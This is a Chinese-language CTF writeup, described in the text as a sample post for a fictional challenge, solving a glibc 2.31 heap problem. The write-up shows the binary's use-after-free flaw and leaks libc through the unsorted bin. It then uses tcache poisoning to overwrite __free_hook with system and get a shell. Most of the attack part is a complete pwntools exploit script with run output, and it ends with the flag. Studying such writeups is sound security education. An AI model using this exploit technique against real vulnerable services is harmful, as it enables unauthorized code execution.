---
title: baby_heap：UAF + tcache poisoning 劫持 __free_hook
date: 2026-10-26
description: 经典 glibc 2.31 堆题。利用 delete 后未清空指针的 UAF，先用 unsorted bin 泄露 libc，再用 tcache poisoning 把 __free_hook 改成 system。
category: pwn
tags: [heap, tcache, UAF, glibc-2.31]
event: DemoCTF 2026
difficulty: 3
points: 300
solves: 42
---

> [!NOTE]
> 这是一篇**示例 writeup**，用来展示博客的排版效果，题目是虚构的。

## 题目信息

附件给了 `baby_heap` 和 `libc-2.31.so`，先看保护：

```console
$ checksec baby_heap
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开，GOT 不可写，那么目标基本就是 libc 里的 hook 了（glibc 2.31 还有 `__free_hook`）。

## 逆向分析

经典菜单题，有 `add / delete / show / edit` 四个功能。问题出在 `delete`：

```c title="delete() — IDA 伪代码"
void delete(void) {
    unsigned int idx = read_int("idx: ");
    if (idx >= 16 || !chunks[idx]) {
        puts("invalid");
        return;
    }
    free(chunks[idx]);
    // chunks[idx] = NULL;   <-- 没有清空！
}
```

`free` 之后指针没有置空，而 `show` 和 `edit` 只检查指针是否为空，所以存在 **UAF**：可以读、写已经释放的 chunk。

> [!TIP]
> 看到“free 后不清空指针”，第一反应就该是：能不能 **leak**（读 fd）+ 能不能 **改 fd**（写 fd）。

## 利用思路

### Step 1：泄露 libc

申请一个大于 tcache 上限（0x410）的 chunk，释放后它会进入 unsorted bin，其 `fd` 指向 `main_arena + 96`。用 `show` 读出来即可算出 libc 基址：

$$
\text{libc\_base} = \text{leak} - (\texttt{\_\_malloc\_hook} + \texttt{0x10} + \texttt{0x60})
$$

注意要在它后面再垫一个小 chunk，防止释放时和 top chunk 合并。

### Step 2：tcache poisoning

glibc 2.31 没有 safe-linking，tcache 的 `fd` 是裸指针。释放两个同样大小的 chunk 后：

```text
tcache[0x90]:  chunk3  ──▶  chunk2  ──▶  NULL
```

利用 UAF 把 `chunk3->fd` 改成 `__free_hook`：

```text
tcache[0x90]:  chunk3  ──▶  __free_hook
```

再 `malloc` 两次，第二次就会拿到 `__free_hook` 处的“chunk”，往里写 `system`。

> [!WARNING] 为什么要释放两个？
> 从 glibc 2.30 开始，`tcache_get` 前会检查 `counts[idx] > 0`。只释放一个的话，第一次 malloc 之后计数就归零了，第二次不会再从 tcache 取。

### Step 3：触发

申请一个内容为 `/bin/sh\0` 的 chunk 并 `free` 它，相当于执行 `system("/bin/sh")`。

## Exploit

```python title="exp.py"
from pwn import *

context(arch="amd64", os="linux", log_level="info")
elf = ELF("./baby_heap")
libc = ELF("./libc-2.31.so")
io = remote("chall.example.com", 1337) if args.REMOTE else process(elf.path)

def menu(c):
    io.sendlineafter(b"> ", str(c).encode())

def add(idx, size, data=b"A"):
    menu(1)
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", data)

def delete(idx):
    menu(2)
    io.sendlineafter(b"idx: ", str(idx).encode())

def show(idx):
    menu(3)
    io.sendlineafter(b"idx: ", str(idx).encode())
    return io.recvline(drop=True)

def edit(idx, data):
    menu(4)
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendafter(b"data: ", data)

# 1. unsorted bin leak
add(0, 0x420)
add(1, 0x18)                       # 隔开 top chunk
delete(0)
leak = u64(show(0).ljust(8, b"\0"))
libc.address = leak - (libc.sym["__malloc_hook"] + 0x10 + 0x60)
log.success(f"libc base: {libc.address:#x}")

# 2. tcache poisoning
add(2, 0x80)
add(3, 0x80)
delete(2)
delete(3)                          # tcache: 3 -> 2
edit(3, p64(libc.sym["__free_hook"]))
add(4, 0x80)
add(5, 0x80, p64(libc.sym["system"]))

# 3. free("/bin/sh") -> system("/bin/sh")
add(6, 0x20, b"/bin/sh\0")
delete(6)

io.interactive()
```

运行结果：

```console
$ python3 exp.py REMOTE
[+] Opening connection to chall.example.com on port 1337: Done
[+] libc base: 0x7f3a9c2e1000
[*] Switching to interactive mode
$ cat flag
```

> [!FLAG]
> flag{t1ca_t1ca_p01s0n1ng_4nd_fr33_h00k}

## 总结

- UAF 的两板斧：**读 fd 泄露地址**、**写 fd 任意分配**。
- glibc 2.32 以后有 safe-linking（`fd` 被 `pos >> 12` 异或），需要先泄露堆地址；2.34 以后 `__free_hook` 也没了，要换别的目标（比如 `_IO_FILE` 相关的利用）。
